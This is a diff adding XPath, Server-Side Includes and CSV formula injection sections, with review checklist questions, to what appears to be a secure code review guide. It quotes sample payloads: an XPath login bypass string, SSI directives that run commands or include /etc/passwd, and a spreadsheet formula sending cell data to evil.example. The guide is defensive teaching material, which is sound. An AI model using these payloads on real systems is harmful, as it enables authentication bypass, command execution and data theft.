@@ -158,6 +158,86 @@ because the taint is "laundered" through the database.
 **In git**: Config values stored in `.gitconfig` are trusted when read back, but
 may contain shell metacharacters if a git hook uses them in a shell command.
 
+### 6. XPath Injection
+
+The XML equivalent of SQL injection: a query is built by string concatenation
+against an XPath expression evaluator instead of being parameterized.
+
+```java
+// Java (javax.xml.xpath) — string-concatenated XPath query
+String expr = "//user[username/text()='" + username +
+              "' and password/text()='" + password + "']";
+XPathExpression xpe = xpath.compile(expr);
+Node match = (Node) xpe.evaluate(doc, XPathConstants.NODE);
+// username = "' or '1'='1" bypasses the credential check entirely —
+// same boolean-injection shape as SQL injection, but against XML data.
+```
+
+```python
+# Python (lxml) — same concatenation pattern
+result = tree.xpath(f"//account[@id='{account_id}']")
+# account_id = "' or '1'='1" returns every account node.
+```
+
+SAST tools tuned for SQL injection sinks frequently do not recognize `xpath.compile`,
+`tree.xpath`, or `.NET`'s `XPathExpression` as injection sinks at all — the query
+language is different even though the concatenation bug is identical.
+
+### 7. SSI (Server-Side Includes) Injection
+
+Unsanitized input reaches a response that the web server parses for SSI directives
+(files served as `.shtml`, `.shtm`, `.stm`, or any path where `mod_include`/SSI
+processing is enabled). The directive syntax `<!--#exec cmd="..."-->` is not a template
+language most SAST rules watch for, so injected user data that later gets written into
+an `.shtml`-served file (a comment field, a logged referrer, a stored username) is missed.
+
+```
+<!--#exec cmd="id" -->                     ← command execution
+<!--#include virtual="/etc/passwd" -->     ← arbitrary file inclusion
+<!--#set var="x" value="$QUERY_STRING" --> ← reflects raw query string
+```
+
+```python
+# Flask app writes an unsanitized comment into a page later served as .shtml
+# by the front-end web server (e.g. Apache with mod_include enabled)
+def save_comment(request):
+    comment = request.form["comment"]           # attacker-controlled
+    with open("comments/latest.shtml", "a") as f:
+        f.write(f"<p>{comment}</p>\n")
+    # If comment contains `<!--#exec cmd="whoami" -->` and the web server (not
+    # the app) is configured to parse .shtml for SSI, the directive executes
+    # server-side the next time the page is rendered — a sink outside the app's
+    # own template engine that most taint trackers never model.
+```
+
+Check the web-server config (Apache `Options +Includes`, `AddType`/`AddHandler
+server-parsed .shtml`) alongside the code — the vulnerability only exists if SSI
+processing is enabled for the path the tainted data reaches.
+
+### 8. CSV / Formula Injection
+
+An untrusted value is written into a cell of a CSV (or XLSX) file that is later opened
+in a spreadsheet application, without neutralizing a leading `=`, `+`, `-`, or `@` —
+each of which spreadsheet software interprets as the start of a formula.
+
+```python
+# Export handler writes user-supplied fields directly into CSV cells
+def export_users_csv(users):
+    writer = csv.writer(response)
+    for u in users:
+        writer.writerow([u.name, u.email, u.notes])
+        # u.notes = '=HYPERLINK("http://evil.example/steal?x="&A1,"Click")'
+        # Opened in Excel/Sheets, this becomes a live formula that can
+        # exfiltrate adjacent cell data or trigger DDE/macro execution
+        # depending on the spreadsheet application's settings.
+```
+
+The fix is not HTML- or SQL-escaping (this is not a web-context sink) — it requires
+prefixing values that begin with `=`, `+`, `-`, `@`, tab, or carriage return with a
+neutralizing character (e.g. a leading `'` or space) before they are written into an
+exported CSV/XLSX cell. Grep CSV/XLSX export code paths (`csv.writer`, `openpyxl`,
+`xlsxwriter`, `ExcelJS`) for user-controlled fields written without this neutralization.
+
 ---
 
 ## C/C++ Specific Patterns
@@ -280,6 +360,21 @@ different library (child_process, handlebars, pug).
 5. **"Are all shell metacharacters handled, or just quotes?"**
    Enumerate: `; | & $ `` ( ) { } < > \n \r ! # ~ *  ? [ ]`. Many custom escaping
    functions handle only `'` and `"`.
+
+6. **"Are XPath/XQuery expressions built by string concatenation instead of a
+   parameterized/compiled variable binding?"** Same shape as SQL injection, different
+   query language — check `xpath.compile`, `tree.xpath`, and equivalent APIs for
+   f-strings or `+` concatenation of untrusted input.
+
+7. **"Does any tainted data reach a file served under `.shtml`/`.shtm`/`.stm`, and is
+   SSI processing enabled for that path?"** Check both the code (where the file gets
+   written) and the web-server config (`Options +Includes`, `AddHandler server-parsed`)
+   — the sink only exists if both conditions hold.
+
+8. **"Does an exported CSV/XLSX cell contain an untrusted value that isn't neutralized
+   against a leading `=`, `+`, `-`, `@`, tab, or CR?"** Check every export path
+   (`csv.writer`, `openpyxl`, `xlsxwriter`, `ExcelJS`) for user-controlled fields
+   written raw into a cell.
 
 ---
 
